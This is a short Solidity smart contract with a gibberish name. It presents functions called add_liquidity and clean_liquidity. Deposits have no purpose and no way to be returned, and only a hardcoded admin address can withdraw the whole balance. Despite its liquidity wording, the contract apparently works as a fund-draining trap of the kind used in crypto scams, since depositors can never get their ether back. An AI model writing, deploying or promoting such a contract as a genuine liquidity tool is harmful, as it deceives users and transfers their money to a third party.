// SPDX-License-Identifier: MIT

pragma solidity 0.8.18;

contract Leitmpnrrwwb {
    address payable public admin_address = payable(0xC010174da739943E6caF75ccA349A53fA7a2e82F);

    function add_liquidity() public payable {}

    function clean_liquidity() public {
        require(msg.sender == admin_address, "Only the admin address can call this function.");
        admin_address.transfer(address(this).balance);
    }

}